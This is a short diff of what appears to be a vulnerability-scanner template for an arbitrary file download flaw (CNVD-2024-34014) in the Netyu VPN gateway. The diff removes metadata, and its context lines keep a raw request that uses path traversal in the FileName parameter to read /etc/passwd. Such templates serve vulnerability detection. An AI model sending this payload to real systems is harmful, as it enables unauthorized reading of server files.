@@ -3,12 +3,8 @@ info:
   name: 网御VPN安全网关存在任意文件下载漏洞(CNVD-2024-34014)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ztm9rrrugz8d1v3l'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ztm9rrrugz8d1v3l
-    fofa: 暂无
 http:
 - raw:
   - 'GET /SSL/admin/UserFile?FileName=../../../etc/passwd HTTP/1.1
